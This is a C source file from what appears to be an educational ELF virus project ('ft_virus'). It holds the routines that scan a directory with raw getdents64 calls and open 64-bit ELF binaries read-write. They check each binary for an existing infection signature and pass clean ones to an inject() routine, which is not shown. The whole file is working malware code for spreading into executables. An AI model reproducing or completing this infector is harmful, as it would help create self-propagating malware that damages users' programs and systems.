#include "ft_virus.h"

# define BUF_SIZE 1024

int FORCE_INLINE signature_present(int fd)
{
	char signature[] = SIGNATURE;
	char buffer[sizeof(signature) - 1];

	// for 5 the size of the jump instruction + 1 for the cipher key
	LSEEK(fd, -1 * ((&payload_end + 6) - &payload_start + (sizeof(signature) - 1)), SEEK_END);
	READ(fd, &buffer, sizeof(signature) - 1);
	if (!ft_memcmp(buffer, signature, sizeof(signature) - 1))
		return (1);
	return (0);

}

int FORCE_INLINE is_good_format(char *filename, char *infested_dir)
{
	char	buf[BUF_SIZE];
	char	elfmag[] = ELFMAG;
	int	fd;
	Elf64_Ehdr header;
	size_t	name_size;
	size_t dir_size;

	dir_size = ft_strlen(infested_dir);
	name_size = ft_strlen(filename);
	if (name_size + dir_size - 1 > BUF_SIZE)
		return (-1);
	ft_memcpy(buf, infested_dir, dir_size);
	ft_memcpy(buf + dir_size, filename, name_size);
	buf[name_size + dir_size] = 0;
	fd = OPEN(buf, O_RDWR);
	if (fd < 0)
		return (-1);
	READ(fd, &header, sizeof(header));
	if (ft_memcmp((char*)&header, elfmag, sizeof(elfmag) - 1)
		|| ((char*)&header)[EI_CLASS] != ELFCLASS64
		|| signature_present(fd))
	{
		CLOSE(fd);
		return (-1);
	}
	return (fd);
}

int finder(t_data data, int dir_fd, char *dir)
{
	int	nread;
	int	bpos;
	struct linux_dirent64 *d;
	char	buf[BUF_SIZE];

	while(1)
	{
		nread = GETDENTS64(dir_fd, buf, BUF_SIZE);
		if (nread < 1)
			return (0);
		bpos = 0;
		while (bpos < nread)
		{
			d = (struct linux_dirent64*)(buf + bpos);
			if (d->d_type == DT_REG &&
					(data.fd = is_good_format(d->d_name, dir)) != -1)
				inject(data);
			bpos += d->d_reclen;
		}
	}
	return (0);
}
